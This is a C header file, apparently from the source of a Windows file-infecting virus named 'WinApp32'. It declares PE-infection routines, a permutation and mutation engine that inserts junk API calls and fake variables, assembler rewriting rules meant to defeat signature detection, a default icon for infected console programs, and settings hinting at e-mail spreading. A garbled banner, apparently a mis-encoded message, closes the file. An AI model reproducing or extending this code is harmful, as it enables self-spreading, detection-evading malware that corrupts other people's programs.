#ifndef _WINAPP32_H_
#define _WINAPP32_H_

#include <windows.h>
#include <wingdi.h>
#include <winbase.h>
#include <winuser.h>
#include <time.h>
#include <shellapi.h>
#include <lzexpand.h>
#include <stdlib.h>
#include <stdio.h>

#ifndef WATCOM_MODE
 #include <dir.h>
#endif

#include <winnt.h>


// Equalization for different compilers
// BC 4.5 vs BC 5.0
#define bool BOOL
#define true TRUE
#define false FALSE
// BC vs Watcom C
#ifdef WATCOM_MODE
 int random(int max);
 #define SEM_NOALIGNMENTFAULTEXCEPT  0x0004
 #define CREATE_DEFAULT_ERROR_MODE   0x04000000
typedef struct _OSVERSIONINFO {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR   szCSDVersion[ 128 ];       // Maintenance string for PSS usage
} OSVERSIONINFO, *POSVERSIONINFO, *LPOSVERSIONINFO;
void fnsplit(char* Path,char* Drive,char* Dir,char* Name,char* Ext);

#endif



//
typedef struct MY_IMAGE_RESOURCE_DIRECTORY_ENTRY {
 union
 {
  struct { DWORD NameOffset:31; DWORD NameIsString:1; }s;
  DWORD Name;
  WORD  Id;
 }u;
 union
 {
  DWORD OffsetToData;
  struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; }s;
 }u2;
} MY_IMAGE_RESOURCE_DIRECTORY_ENTRY, *MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY;

// Global constants
#define TimerDelay 1000
#define min_inf_size             10240
#define max_inf_size             (700*1024)
#define COPY_BLOCK_SIZE          32768

#define FILE_FORMAT_UNRECOGNIZED 0
#define FILE_FORMAT_MZ           1
#define FILE_FORMAT_NE           2
#define FILE_FORMAT_PE           3
#define FILE_FORMAT_LE           4
#define FILE_FORMAT_LX           5

#define COMPILER_NONE            0
#define COMPILER_BORLAND         1
#define COMPILER_WATCOM          2

#define SYSTEM_UNKNOWN           0
#define SYSTEM_WIN95             1
#define SYSTEM_WINNT             2

// Size-related constants
DWORD VSize = 62976; const char vs_const[]="!!! CODE SIZE !!!";
DWORD SSize = 33263; const char ss_const[]="!!! LZ SRC SIZE !!!";

// Misc constants
const char IDAtom[]                     = "WinApp32_TSR_INSTALLED";
const char WinApp32[]                   = "WinApp32";
const char Logging[]                    = "Logging";
const char LogPath[]                    = "LogPath";
const char ShowDotsOn[]                 = "ShowDotsOn";
const char PM_TargetPath[]              = "PMTarget";
const char Ini_NoInfect[]               = "NoInfect";
const char Ini_Test[]                   = "Test";
const char Ini_LastSend[]               = "LastEmail";
const char Arrived[]                    = "Arrived";

// Global variables

bool    TimeToGo = false;
int     CurrentCompiler = COMPILER_NONE;
bool    BadImage = true;        // Virus image is invalid or still not loaded
bool    Prompt = false;
bool    LoggingEnabled = false;
char    LogFileName[MAX_PATH];
char    MyName[MAX_PATH];
char    CommandLine[MAX_PATH];
void*   VPtr = NULL;
void*   SrcPtr = NULL;
bool    Permutated = false;
bool    NoInfect = false;
HANDLE  MyInstance;
char    CRoot[MAX_PATH];
void*   MyIcon;
int     System = SYSTEM_UNKNOWN;
DWORD   Fuck = 0;

// Procedures
void    InitAll();
int     PASCAL           WinMain(HINSTANCE,HINSTANCE,LPSTR,int);
LRESULT CALLBACK _export MainWndProc(HWND,UINT,WPARAM,LPARAM);
void    DiagInit();
void    DiagMsg(char* ss);
bool    AskBoss(char* ss);
void    Log(char* ss, char* LogFile = LogFileName, bool AddInfo = true);
bool    RWDir(char* ss);
void    InfectPE(char* TargetName);
void    LoadCarrier();
int     DetectFileFormat(char* TargetName);
bool    GetTempDir(char* s);
char*   Ext(char* Name);
bool    Already(char* TargetName);
void    ProcessFile(char* TargetName);
void    PermutationEngine();
bool    Exec(char* Command, char* WorkDir, DWORD TOut = (3*60*1000));
bool    Readln(HANDLE h, char* s);
bool    Writeln(HANDLE h, const char* s);
int     GetNextName(char* ss);
void    PrepareSearch();
DWORD   FindIcon(char* TargetName);
void    iGetWindowText(HWND hWnd, char* s, int MaxSize);
void    GetLocalTimeStr(char* s);


// Mutation engine signal strings
const char    MUT[] = "/*MUT*/";
const char    PM_Declare[] = "//Declaration";
const char    PM_EndLine[] = ";;";
// Mutation engine data
#define MAX_LINE 666
#define MAX_TYPE_ID_LENGTH 30
#define N_TYPES 7
struct  TTypeRec
{
 char sh[3];
 char lo[MAX_TYPE_ID_LENGTH];
 int  ari;
};
TTypeRec Types[N_TYPES] =
 {
  {"ui","UINT",1},
  {"ii","int",1},
  {"uc","unsigned char",1},
  {"bo","bool",0},
  {"dw","DWORD",1},
  {"ch","char",0},
  {"hw","HWND",0}
 };

#define N_ARI_OP 6
char ari_op[N_ARI_OP][3] = {"+","-","*","^","|","&"};


#define N_API_CALLS 22
struct TApiCallRec
{
 char name[50];
 bool RetVoid;
 char ret_type[3];
 int  num_params;
 char params[5][3];
} ApiCallData[N_API_CALLS] =
 {
  {"GetVersion",false,"dw",0,{"","","","",""} },  //1
  {"AnyPopup",false,"bo",0,{"","","","",""} },    //22
  {"FindExecutable",true,"??",3,{"ch","ch","ch","",""} }, //2
  {"FindWindow",false,"hw",2,{"ch","ch","","",""} },      //3
  {"GdiFlush",true,"??",0,{"","","","",""} },             //4
  {"GdiGetBatchLimit",false,"dw",0,{"","","","",""} },    //5
  {"GetActiveWindow",false,"hw",0,{"","","","",""} },     //6
  {"GetCapture",false,"hw",0,{"","","","",""} },          //7
  {"GetCaretBlinkTime",false,"ui",0,{"","","","",""} },   //8
  {"GetConsoleCP",false,"ui",0,{"","","","",""} },        //9
  {"GetCurrentTime",false,"dw",0,{"","","","",""} },      //10
  {"GetDesktopWindow",false,"hw",0,{"","","","",""} },    //11
  {"GetDialogBaseUnits",false,"ii",0,{"","","","",""} },  //12
  {"GetDoubleClickTime",false,"ui",0,{"","","","",""} },  //13
  {"GetForegroundWindow",false,"hw",0,{"","","","",""} }, //14
  {"GetInputState",false,"bo",0,{"","","","",""} },       //15
  {"GetKBCodePage",false,"ui",0,{"","","","",""} },       //16
  {"GetKeyboardLayoutName",false,"bo",1,{"ch","","","",""} }, //17
  {"GetKeyboardType",false,"ii",1,{"ii","","","",""} },   //18
  {"GetLastError",false,"dw",0,{"","","","",""} },        //19
  {"GetLogicalDrives",false,"dw",0,{"","","","",""} },    //20
  {"GetTickCount",false,"dw",0,{"","","","",""} }         //21
 }; // Last letter H in OWL Help

// Fake variables
UINT          XXui0,XXui1,XXui2,XXui3;
unsigned char XXuc0,XXuc1,XXuc2,XXuc3;
DWORD         XXdw0,XXdw1,XXdw2,XXdw3;
int           XXii0,XXii1,XXii2,XXii3;
bool          XXbo0,XXbo1,XXbo2,XXbo3;
HWND          XXhw0,XXhw1,XXhw2,XXhw3;
char          XXch0[MAX_LINE] = "";
char          XXch1[MAX_LINE] = "";
char          XXch2[MAX_LINE] = "";
char          XXch3[MAX_LINE] = "";


// Assembler ME constants
#define N_REGISTERS 6
char AsmRegisters[N_REGISTERS][4] = {"eax","ebx","ecx","edx","esi","edi"};


#define ASM_NONE       0
#define ASM_OP1        1
#define ASM_OP2        2
#define ASM_OP3        3
#define ASM_TR1        4
#define ASM_TR2        5
#define ASM_LABEL      6
#define ASM_END_MARK   6

// Asm Flags
#define AF_NONE        0
#define AF_REGS_ONLY   1


struct AsmNewInstructionInfo
{
 char cast[40];   // Mnemonic (incl %s if needed)
 int  num_cast,w[3];
};

#define MAX_NEW_INSTRUCTIONS 5
struct AsmTranslationRule
{
 char OM[7];  // Original mnemonic
 int  Flags;
 AsmNewInstructionInfo New[MAX_NEW_INSTRUCTIONS];
};

DWORD RetAddress = 0;;

#define N_ASMTRULES 7
AsmTranslationRule AsmTRules[N_ASMTRULES] =
 {
  {
   "mov",
   0,
   {
    {"push %s",1,ASM_OP2,0,0},
    {"GLUCK",0,0,0,0},
    {"pop %s",1,ASM_OP1,0,0},
    {"",0,0,0,0},
    {"",0,0,0,0}
   }
  },

  {
   "inc",
   0,
   {
    {"GLUCK",0,0,0,0},
    {"add %s,1",1,ASM_OP1,0,0},
    {"GLUCK",0,0,0,0},
    {"",0,0,0,0},
    {"",0,0,0,0}
   }
  },

  {
   "dec",
   0,
   {
    {"GLUCK",0,0,0,0},
    {"sub %s,1",1,ASM_OP1,0,0},
    {"GLUCK",0,0,0,0},
    {"",0,0,0,0},
    {"",0,0,0,0}
   }
  },

  {
   "call",
   0,
   {
    {"push offset %s",1,ASM_END_MARK,0,0},
    {"GLUCK",0,0,0,0},
    {"jmp %s",1,ASM_OP1,0,0},
    {"GLUCK",0,0,0,0},
    {"",0,0,0,0}
   }
  },

  {
   "push",
   AF_REGS_ONLY,
   {
    {"GLUCK",0,0,0,0},
    {"sub esp,4",0,0,0,0},
    {"GLUCK",0,0,0,0},
    {"mov dword ptr ss:[esp],%s",1,ASM_OP1,0,0},
    {"GLUCK",0,0,0,0}
   }
  },

  {
   "pop",
   AF_REGS_ONLY,
   {
    {"GLUCK",0,0,0,0},
    {"mov %s,dword ptr ss:[esp]",1,ASM_OP1,0,0},
    {"GLUCK",0,0,0,0},
    {"add esp,4",0,0,0,0},
    {"GLUCK",0,0,0,0}
   }
  },


  {
   "xchg",
   0,
   {
    {"push %s",1,ASM_OP1,0,0},
    {"push %s",1,ASM_OP2,0,0},
    {"GLUCK",0,0,0,0},
    {"pop %s",1,ASM_OP1,0,0},
    {"pop %s",1,ASM_OP2,0,0}
   }
  }

 }; // End of Asm translation rules


// Default icon for console apps infection
char DefaultIcon[744] = {40,0,0,0,32,0,0,0,64,0,0,0,1,0,4,0,0,0,0,0,128,2,0,
 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,128,0,0,0,128,128,0,128,
 0,0,0,128,0,128,0,128,128,0,0,128,128,128,0,192,192,192,0,0,0,255,0,0,255,0,
 0,0,255,255,0,255,0,0,0,255,0,255,0,255,255,0,0,255,255,255,0,0,0,0,0,0,0,0,
 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
 0,0,0,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,112,120,136,
 136,136,136,136,136,136,136,136,136,136,136,136,136,112,120,127,255,255,255,
 255,255,255,255,255,255,255,255,255,248,112,120,127,255,255,255,255,255,255,
 255,255,255,255,255,255,248,112,120,127,255,255,255,255,255,255,255,255,255,
 255,255,255,248,112,120,127,255,255,255,255,255,255,255,255,255,255,255,255,
 248,112,120,127,255,255,255,255,255,255,255,255,255,255,255,255,248,112,120,
 127,255,255,255,255,255,255,255,255,255,255,255,255,248,112,120,127,255,255,
 255,255,255,255,255,255,255,255,255,255,248,112,120,127,255,255,255,255,255,
 255,255,255,255,255,255,255,248,112,120,127,255,255,255,255,255,255,255,255,
 255,255,255,255,248,112,120,127,255,255,255,255,255,255,255,255,255,255,255,
 255,248,112,120,127,255,255,255,255,255,255,255,255,255,255,255,255,248,112,
 120,127,255,255,255,255,255,255,255,255,255,255,255,255,248,112,120,127,255,
 255,255,255,255,255,255,255,255,255,255,255,248,112,120,127,255,255,255,255,
 255,255,255,255,255,255,255,255,248,112,120,127,255,255,255,255,255,255,255,
 255,255,255,255,255,248,112,120,127,255,255,255,255,255,255,255,255,255,255,
 255,255,248,112,120,127,255,255,255,255,255,255,255,255,255,255,255,255,248,
 112,120,127,255,255,255,255,255,255,255,255,255,255,255,255,248,112,120,119,
 119,119,119,119,119,119,119,119,119,119,119,119,120,112,120,136,136,136,136,
 136,136,136,136,136,136,136,136,136,136,112,120,68,68,68,68,68,68,68,68,68,
 64,0,0,0,0,112,120,68,68,68,68,68,68,68,68,68,72,128,136,8,128,112,120,68,68,
 68,68,68,68,68,68,68,72,128,136,8,128,112,120,68,68,68,68,68,68,68,68,68,68,
 68,68,68,68,112,120,136,136,136,136,136,136,136,136,136,136,136,136,136,136,
 112,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,112,0,0,0,0,
 0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255,255,255,255,255,0,0,0,0,0,0,0,0,0,0,
 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255
 };

char Trimon[] =
" ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»\n\
 º ’ˆŒ„…ˆ ’‚… ‚‘œŒˆ‹Ÿ„‘Š… ’…ˆ‡„ˆ™…, •“…‘“—ˆ‰ €€•’ !  º\n\
 º ‡€ˆ‡„Œ…„“‡œ …ˆ ’‚  Œ“„‹Ÿ„‘Š“ ƒ‹’Š“, ‹Ÿ„œ ‘“—œŸ, …‹  º\n\
 º Œ•ƒ…, ‘’€•ˆ‡„ˆ™…  ‡€‹“ƒ‹€‡… ! ‚•“…Œ€’…ˆ  €•ˆˆ‡„ˆ’, º\n\
 º …€›‰  ‚  ’,  ƒ€„›‰  …„…€‘’, ‚€”‹…’‘’‰ˆŠ ‘…Œˆ‘’“‰›‰, º\n\
 º …•’œ „‡€‹“€Ÿ,‹Ÿ„œ ……Œ„…‹…€Ÿ,’ˆ…‹‘’Œ„‚…‚˜€Ÿ º\n\
 º •“…€…‰˜€Ÿ, …ˆ‹Ÿ„‘Š€Ÿ ˆ‡„“˜ˆ€ ‘ ……Š‘…‹…›Œ €•“‰  º\n\
 º …€‹Œ, Œ„‡€‹“‹…‰ ‹’•“Ÿ‰, ‡€‹“€ …„…€€Ÿ !         º\n\
 º •“…‹Ÿ„ˆˆ‡„†€œŸ ‡€Œ“„…ˆ€, ‡€‘€ŠŒ„•“‰ ’‚… …‹†œ…      º\n\
 º Œ„ˆ‹, ‡‹…“—ˆ‰ ˆ‡„•“‰ !                                      º\n\
 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼\n";


#endif
